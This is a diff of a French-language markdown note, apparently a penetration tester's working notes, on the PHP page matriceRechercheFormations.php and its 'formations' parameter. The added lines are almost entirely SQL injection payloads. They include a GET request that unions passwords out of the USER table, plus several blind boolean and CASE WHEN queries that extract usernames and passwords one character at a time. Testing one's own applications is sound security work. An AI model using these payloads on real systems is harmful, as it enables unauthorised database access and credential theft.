@@ -41,11 +41,21 @@ Fichier: matriceRechercheFormations.php (appelé par le fichier resultatRecherch
 ![[Pasted image 20260421103726.png]]
 ```
 SELECT DISTINCT s.idSalarie FROM SALARIE s, FORMATION f WHERE s.idSalarie = f.employe AND s.archive = 0
-  AND (f.employe IN (SELECT employe FROM FORMATION WHERE archive = 0 AND nom_formation = 10)) ORDER BY 1
+  AND (f.employe IN (SELECT employe FROM FORMATION WHERE archive = 0 AND nom_formation = 10)) UNION SELECT CASE WHEN (SELECT substr(username,1,1) FROM `USER` WHERE password='test' LIMIT 1)='t' THEN 1 ELSE 0 END-- 
   
+  GET /matriceRechercheFormations.php?formations=10))+UNION+SELECT+password+FROM+USER--+ 
   
-  
-  AND (s.fonction_fiche = 1)
+   UNION+SELECT+username+FROM+USER+WHERE+iduser=1+AND+(SELECT+substr(username,1,1)+FROM+USER+WHERE+iduser=1)=A
+   
+   UNION+SELECT+(SELECT+substr(username,1,1)+FROM+USER+WHERE+iduser=1)=a+--
+   
+   UNION+SELECT+CASE+WHEN+(SELECT+substr(username,1,1)+FROM+USER+WHERE+iduser=1)='t'+THEN+1+ELSE+0+END--+
+   
+  formations=10))+UNION+SELECT+CASE+WHEN+(SELECT+substr(username,1,1)+FROM+USER+WHERE+password=test)='t'+THEN+1+ELSE+0+END--+ 
+
+UNION+SELECT+(SELECT+substr(password,1,1)+FROM+`USER`+WHERE+username='test'+LIMIT+1)
+UNION SELECT substr(password,1,1) FROM `USER` WHERE username='test' LIMIT 1--+
+
 ```
 
 
